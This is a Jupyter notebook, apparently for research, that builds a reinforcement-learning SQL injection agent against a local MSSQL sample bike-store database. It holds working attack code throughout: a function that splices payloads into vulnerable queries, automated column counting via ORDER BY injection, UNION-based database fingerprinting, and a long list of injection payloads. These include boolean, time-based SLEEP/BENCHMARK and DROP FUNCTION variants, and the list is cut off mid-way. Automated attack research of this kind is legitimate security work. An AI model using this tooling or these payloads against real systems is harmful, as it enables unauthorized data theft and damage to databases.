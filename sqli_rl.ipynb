{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DATABASE CONFIGURATION**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sqlalchemy.engine import URL\n",
    "from sqlalchemy import create_engine\n",
    "import numpy as np\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from keras import layers\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import sys\n",
    "from enum import Enum\n",
    "import time\n",
    "import hashlib\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Load Configuration File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'database': {'name': 'BikeStores', 'server': '.\\\\SQLEXPRESS', 'driver': 'SQL Server', 'sample_query': 'SELECT * FROM production.brands'}, 'rl': {'state_info': {'mark_error': True}, 'contexts': [{'query': \"SELECT * FROM production.products WHERE brand_id='[INPUT]' AND category_id=8\", 'table_filter': ['production.products'], 'column_filter': ['product_name'], 'goal': 'Trek 820 - 2016'}, {'query': \"SELECT * FROM sales.customers WHERE email='[INPUT]'\", 'table_filter': ['sales.customers'], 'column_filter': ['email'], 'goal': 'debra.burks@yahoo.com'}]}}\n"
     ]
    }
   ],
   "source": [
    "with open('config.json', 'r') as config_file:\n",
    "    config = json.load(config_file)\n",
    "    print(config)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set Up Connection to Microsoft SQL Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   brand_id    brand_name\n",
      "0         1       Electra\n",
      "1         2          Haro\n",
      "2         3        Heller\n",
      "3         4   Pure Cycles\n",
      "4         5       Ritchey\n",
      "5         6       Strider\n",
      "6         7  Sun Bicycles\n",
      "7         8         Surly\n",
      "8         9          Trek\n"
     ]
    }
   ],
   "source": [
    "db = config['database']\n",
    "\n",
    "db_name = db['name']\n",
    "db_server = db['server']\n",
    "db_driver = db['driver']\n",
    "\n",
    "# Connect to SQL database using the above parameters.\n",
    "conn_string = f'DRIVER={db_driver};SERVER={db_server};DATABASE={db_name};Trusted_Connection=yes'\n",
    "conn_url = URL.create('mssql+pyodbc', query={'odbc_connect': conn_string})\n",
    "engine = create_engine(conn_url)\n",
    "\n",
    "# Display a dataframe from a sample query if set.\n",
    "if 'sample_query' in db:\n",
    "    sample_query = db['sample_query']\n",
    "    df = pd.read_sql(sample_query, engine)\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Get All Tables and Columns to Define Action Space With"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(['production.categories',\n",
       "  'production.brands',\n",
       "  'production.products',\n",
       "  'sales.customers',\n",
       "  'sales.stores',\n",
       "  'sales.staffs',\n",
       "  'sales.orders',\n",
       "  'sales.order_items',\n",
       "  'production.stocks'],\n",
       " [['category_id', 'category_name'],\n",
       "  ['brand_id', 'brand_name'],\n",
       "  ['product_id',\n",
       "   'product_name',\n",
       "   'brand_id',\n",
       "   'category_id',\n",
       "   'model_year',\n",
       "   'list_price'],\n",
       "  ['customer_id',\n",
       "   'first_name',\n",
       "   'last_name',\n",
       "   'phone',\n",
       "   'email',\n",
       "   'street',\n",
       "   'city',\n",
       "   'state',\n",
       "   'zip_code'],\n",
       "  ['store_id',\n",
       "   'store_name',\n",
       "   'phone',\n",
       "   'email',\n",
       "   'street',\n",
       "   'city',\n",
       "   'state',\n",
       "   'zip_code'],\n",
       "  ['staff_id',\n",
       "   'first_name',\n",
       "   'last_name',\n",
       "   'email',\n",
       "   'phone',\n",
       "   'active',\n",
       "   'store_id',\n",
       "   'manager_id'],\n",
       "  ['order_id',\n",
       "   'customer_id',\n",
       "   'order_status',\n",
       "   'order_date',\n",
       "   'required_date',\n",
       "   'shipped_date',\n",
       "   'store_id',\n",
       "   'staff_id'],\n",
       "  ['order_id', 'item_id', 'product_id', 'quantity', 'list_price', 'discount'],\n",
       "  ['store_id', 'product_id', 'quantity']])"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Gather a list of every user-defined table in the database.\n",
    "# TODO: Verify that every table is retrieved.\n",
    "def get_tables():\n",
    "    tables = []\n",
    "    columns = []\n",
    "    df = pd.read_sql('SELECT * FROM INFORMATION_SCHEMA.COLUMNS', engine)\n",
    "\n",
    "    schemas = df['TABLE_SCHEMA']\n",
    "    table_names = df['TABLE_NAME']\n",
    "    column_names = df['COLUMN_NAME']\n",
    "\n",
    "    prev_table = None\n",
    "    for i in range(0, len(schemas)):\n",
    "        if schemas[i] is not None:\n",
    "            table_name = schemas[i] + '.' + table_names[i]\n",
    "        else:\n",
    "            table_name = table_names[i]\n",
    "            \n",
    "        if table_name not in tables:\n",
    "            tables.append(table_name)\n",
    "\n",
    "        last_table = tables[len(tables)-1]\n",
    "        if prev_table is last_table:\n",
    "            columns[len(columns)-1].append(column_names[i])\n",
    "        else:\n",
    "            prev_table = last_table\n",
    "            columns.append([column_names[i]])\n",
    "        \n",
    "    return tables, columns\n",
    "    \n",
    "tables, columns = get_tables()\n",
    "tables, columns"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define State Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [],
   "source": [
    "state_info_config = config['rl']['state_info']\n",
    "mark_error = state_info_config['mark_error']\n",
    "features = 16 # MD5 hash byte count. \n",
    "if mark_error:\n",
    "    features += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define RL Contexts and Incrementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [],
   "source": [
    "contexts = config['rl']['contexts']\n",
    "\n",
    "# Increments RL context and returns whether another context was assigned.\n",
    "def increment_context():\n",
    "    global context, context_index\n",
    "    if context_index < len(contexts) - 1:\n",
    "        context_index += 1\n",
    "        context = contexts[context_index]\n",
    "\n",
    "# Not having any defined RL contexts will result in an error.\n",
    "def reset_context():\n",
    "    global context, context_index\n",
    "    context = contexts[0]\n",
    "    context_index = 0\n",
    "\n",
    "reset_context()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create SQL Injection Attack Capability"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "def inject_payload(payload, context):\n",
    "    # Finds [INPUT] within the context query configuration and replaces it with the payload.\n",
    "    query = context['query']\n",
    "    query = query.replace('[INPUT]', payload)\n",
    "    # Runs SQL injection query.\n",
    "    return pd.read_sql(query, engine)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Enumerate SQL Database Types"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DBType(Enum):\n",
    "    MSSQL = 0\n",
    "    MySQL = 1\n",
    "    Oracle = 2\n",
    "    PostgeSQL = 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Gets Column Counts for Each Context"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Column counts for table returned by each context.\n",
    "#\n",
    "# PostgreSQL tables can have no columns.\n",
    "# Source: https://stackoverflow.com/questions/2438321/create-a-table-without-columns#:~:text=A%20table%20is%20a%20collection,need%20at%20least%20one%20column.&text=in%20postgresql%20you%20can%20indeed%20create%20tables%20without%20columns.\n",
    "context_col_counts = [0 for c in contexts]\n",
    "\n",
    "for i in range(0, len(contexts)):\n",
    "    # Finds column counts for each context by iterating using ORDER BY until an error occurs.\n",
    "    #\n",
    "    # Max possible number of SQL columns is 30,000, so this loop should always break.\n",
    "    # IBM source: https://www.ibm.com/support/pages/filenet-content-manager-ms-sql-server-database-table-limitations-columns-and-row-size#:~:text=the%20object%20store.-,Answer,30%2C000%20columns%20instead%20of%201024.\n",
    "    while True:\n",
    "        payload = f'\\' ORDER BY {context_col_counts[i]+1}--'\n",
    "        try:\n",
    "            df = inject_payload(payload, contexts[i])\n",
    "            context_col_counts[i] += 1\n",
    "        except:\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tries to Retrieve Database Type by Injecting Version UNION Payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DBType.MSSQL\n"
     ]
    }
   ],
   "source": [
    "# With the number of columns gathered, we can perform UNION statements to find the\n",
    "# SQL database type and version. To achieve this, we must find a String column for\n",
    "# the version information to be returned in.\n",
    "#\n",
    "# Database version payloads are for Microsoft and MySQL, Oracle, and PostgreSQL respectively.\n",
    "# Retreived from: https://portswigger.net/web-security/sql-injection/examining-the-database\n",
    "db_suffixes = ['@@version', '* FROM v$version', 'version()']\n",
    "db_type = None\n",
    "col_count0 = context_col_counts[0]\n",
    "for suffix in db_suffixes:\n",
    "    for i in range(0, col_count0):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        for j in range(0, col_count0):\n",
    "            if i != j:\n",
    "                payload += 'NULL'\n",
    "            else:\n",
    "                payload += suffix\n",
    "            if j != col_count0 - 1:\n",
    "                payload += ','\n",
    "            else:\n",
    "                payload += '--'\n",
    "        try:\n",
    "            df = inject_payload(payload, context)\n",
    "            res = df.iloc[-1,i]\n",
    "            if suffix == db_suffixes[0]:\n",
    "                if 'Microsoft SQL Server' in res:\n",
    "                    db_type = DBType.MSSQL\n",
    "                else:\n",
    "                    db_type = DBType.MySQL\n",
    "            elif suffix == db_suffixes[1]:\n",
    "                db_type == DBType.Oracle\n",
    "            elif suffix == db_suffixes[2]:\n",
    "                db_type = DBType.PostgeSQL\n",
    "            break\n",
    "        except:\n",
    "            continue\n",
    "\n",
    "# TODO: Use DB type to filter action space.\n",
    "print(db_type)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**REINFORCEMENT LEARNING**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"' OR 1=1\",\n",
       " \"' OR 1=0\",\n",
       " \"' OR x=x\",\n",
       " \"' OR x=y\",\n",
       " \"' OR 1=1#\",\n",
       " \"' OR 1=0#\",\n",
       " \"' OR x=x#\",\n",
       " \"' OR x=y#\",\n",
       " \"' OR 1=1-- \",\n",
       " \"' OR 1=0-- \",\n",
       " \"' OR x=x-- \",\n",
       " \"' OR x=y-- \",\n",
       " \"' OR 3409=3409 AND ('pytW' LIKE 'pytW\",\n",
       " \"' OR 3409=3409 AND ('pytW' LIKE 'pytY\",\n",
       " \"' HAVING 1=1\",\n",
       " \"' HAVING 1=0\",\n",
       " \"' HAVING 1=1#\",\n",
       " \"' HAVING 1=0#\",\n",
       " \"' HAVING 1=1-- \",\n",
       " \"' HAVING 1=0-- \",\n",
       " \"' AND 1=1\",\n",
       " \"' AND 1=0\",\n",
       " \"' AND 1=1-- \",\n",
       " \"' AND 1=0-- \",\n",
       " \"' AND 1=1#\",\n",
       " \"' AND 1=0#\",\n",
       " \"' AND 1=1 AND '%'='\",\n",
       " \"' AND 1=0 AND '%'='\",\n",
       " \"' AND 1083=1083 AND (1427=1427\",\n",
       " \"' AND 7506=9091 AND (5913=5913\",\n",
       " \"' AND 1083=1083 AND ('1427=1427\",\n",
       " \"' AND 7506=9091 AND ('5913=5913\",\n",
       " \"' AND 7300=7300 AND 'pKlZ'='pKlZ\",\n",
       " \"' AND 7300=7300 AND 'pKlZ'='pKlY\",\n",
       " \"' AND 7300=7300 AND ('pKlZ'='pKlZ\",\n",
       " \"' AND 7300=7300 AND ('pKlZ'='pKlY\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1#\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0#\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1--\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0--\",\n",
       " \"' WHERE 1=1 AND 1=1\",\n",
       " \"' WHERE 1=1 AND 1=0\",\n",
       " \"' WHERE 1=1 AND 1=1#\",\n",
       " \"' WHERE 1=1 AND 1=0#\",\n",
       " \"' WHERE 1=1 AND 1=1--\",\n",
       " \"' WHERE 1=1 AND 1=0--\",\n",
       " \"' ORDER BY 1-- \",\n",
       " \"' ORDER BY 2-- \",\n",
       " \"' ORDER BY 3-- \",\n",
       " \"' ORDER BY 4-- \",\n",
       " \"' ORDER BY 5-- \",\n",
       " \"' ORDER BY 6-- \",\n",
       " \"' ORDER BY 7-- \",\n",
       " \"' ORDER BY 8-- \",\n",
       " \"' ORDER BY 9-- \",\n",
       " \"' ORDER BY 10-- \",\n",
       " \"' ORDER BY 11-- \",\n",
       " \"' ORDER BY 12-- \",\n",
       " \"' ORDER BY 13-- \",\n",
       " \"' ORDER BY 14-- \",\n",
       " \"' ORDER BY 15-- \",\n",
       " \"' ORDER BY 16-- \",\n",
       " \"' ORDER BY 17-- \",\n",
       " \"' ORDER BY 18-- \",\n",
       " \"' ORDER BY 19-- \",\n",
       " \"' ORDER BY 20-- \",\n",
       " \"' ORDER BY 21-- \",\n",
       " \"' ORDER BY 22-- \",\n",
       " \"' ORDER BY 23-- \",\n",
       " \"' ORDER BY 24-- \",\n",
       " \"' ORDER BY 25-- \",\n",
       " \"' ORDER BY 26-- \",\n",
       " \"' ORDER BY 27-- \",\n",
       " \"' ORDER BY 28-- \",\n",
       " \"' ORDER BY 29-- \",\n",
       " \"' ORDER BY 30-- \",\n",
       " \"' ORDER BY 31337-- \",\n",
       " \"' ORDER BY 1# \",\n",
       " \"' ORDER BY 2# \",\n",
       " \"' ORDER BY 3# \",\n",
       " \"' ORDER BY 4# \",\n",
       " \"' ORDER BY 5# \",\n",
       " \"' ORDER BY 6# \",\n",
       " \"' ORDER BY 7# \",\n",
       " \"' ORDER BY 8# \",\n",
       " \"' ORDER BY 9# \",\n",
       " \"' ORDER BY 10# \",\n",
       " \"' ORDER BY 11# \",\n",
       " \"' ORDER BY 12# \",\n",
       " \"' ORDER BY 13# \",\n",
       " \"' ORDER BY 14# \",\n",
       " \"' ORDER BY 15# \",\n",
       " \"' ORDER BY 16# \",\n",
       " \"' ORDER BY 17# \",\n",
       " \"' ORDER BY 18# \",\n",
       " \"' ORDER BY 19# \",\n",
       " \"' ORDER BY 20# \",\n",
       " \"' ORDER BY 21# \",\n",
       " \"' ORDER BY 22# \",\n",
       " \"' ORDER BY 23# \",\n",
       " \"' ORDER BY 24# \",\n",
       " \"' ORDER BY 25# \",\n",
       " \"' ORDER BY 26# \",\n",
       " \"' ORDER BY 27# \",\n",
       " \"' ORDER BY 28# \",\n",
       " \"' ORDER BY 29# \",\n",
       " \"' ORDER BY 30#\",\n",
       " \"' ORDER BY 31337#\",\n",
       " \"' ORDER BY 1 \",\n",
       " \"' ORDER BY 2 \",\n",
       " \"' ORDER BY 3 \",\n",
       " \"' ORDER BY 4 \",\n",
       " \"' ORDER BY 5 \",\n",
       " \"' ORDER BY 6 \",\n",
       " \"' ORDER BY 7 \",\n",
       " \"' ORDER BY 8 \",\n",
       " \"' ORDER BY 9 \",\n",
       " \"' ORDER BY 10 \",\n",
       " \"' ORDER BY 11 \",\n",
       " \"' ORDER BY 12 \",\n",
       " \"' ORDER BY 13 \",\n",
       " \"' ORDER BY 14 \",\n",
       " \"' ORDER BY 15 \",\n",
       " \"' ORDER BY 16 \",\n",
       " \"' ORDER BY 17 \",\n",
       " \"' ORDER BY 18 \",\n",
       " \"' ORDER BY 19 \",\n",
       " \"' ORDER BY 20 \",\n",
       " \"' ORDER BY 21 \",\n",
       " \"' ORDER BY 22 \",\n",
       " \"' ORDER BY 23 \",\n",
       " \"' ORDER BY 24 \",\n",
       " \"' ORDER BY 25 \",\n",
       " \"' ORDER BY 26 \",\n",
       " \"' ORDER BY 27 \",\n",
       " \"' ORDER BY 28 \",\n",
       " \"' ORDER BY 29 \",\n",
       " \"' ORDER BY 30 \",\n",
       " \"' ORDER BY 31337 \",\n",
       " \"' RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
       " \"' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
       " \"' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\",\n",
       " \"' IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\",\n",
       " \"' %' AND 8310=8310 AND '%'='\",\n",
       " \"' %' AND 8310=8311 AND '%'='\",\n",
       " \"' ORDER BY SLEEP(5)\",\n",
       " \"' ORDER BY 1,SLEEP(5)\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\",\n",
       " \"' ORDER BY SLEEP(5)#\",\n",
       " \"' ORDER BY 1,SLEEP(5)#\",\n",
       " \"' ORDER BY 1,SLEEP(5),3#\",\n",
       " \"' ORDER BY 1,SLEEP(5),3,4#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\",\n",
       " \"' ORDER BY SLEEP(5)-- \",\n",
       " \"' ORDER BY 1,SLEEP(5)-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),3-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),3,4-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
